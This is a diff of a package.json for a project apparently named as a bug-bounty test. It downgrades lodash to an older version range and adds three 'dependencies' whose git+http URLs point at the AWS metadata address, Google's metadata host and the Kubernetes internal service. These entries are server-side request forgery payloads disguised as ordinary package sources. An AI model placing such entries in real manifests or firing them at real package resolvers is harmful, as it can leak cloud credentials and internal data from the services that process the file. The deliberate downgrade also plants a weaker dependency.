@@ -2,7 +2,7 @@
   "name": "bb-test",
   "version": "0.1.0",
   "dependencies": {
-    "lodash": "^4.17.20",
+    "lodash": "^4.17.15",
     "ssrf-aws": "git+http://169.254.169.254/latest/meta-data/#main",
     "ssrf-gcp": "git+http://metadata.google.internal/computeMetadata/v1/#main",
     "ssrf-k8s": "git+http://kubernetes.default.svc/#main",
